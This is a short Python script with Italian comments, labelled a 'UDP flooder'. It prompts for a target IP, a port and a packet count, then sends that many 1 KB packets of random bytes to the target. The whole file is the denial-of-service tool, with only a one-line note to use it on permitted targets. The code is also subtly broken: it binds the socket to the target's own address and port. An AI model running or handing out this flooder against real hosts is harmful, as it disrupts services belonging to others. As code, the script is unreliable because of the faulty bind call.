
#UDP flooder - utilizzare solo su target per i quali si hanno i permessi per farlo

import socket
import random                                                       #importo il modulo random per creare pacchetti di byte casuali


targetip = input("Inserisci l'indirizzo IP del target: ")
targetport = int(input("Inserisci la porta del target: "))
npack = int(input("Quanti pacchetti da 1 KB vuoi inviare?  "))

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		        #SOCK_DGRAM = UDP protocol

s.bind((targetip,targetport))

address = (targetip,targetport)					                    #creazione della destinazione da utilizzare con il metodo sendto()

for x in range(npack):						                        #ciclo che esegue il metodo sendto() tante volte quante sono i pacchetti che vogliamo inviare
	data = random.randbytes(1024)				                    #creazione pacchetto con byte casuali
	s.sendto(data,address)

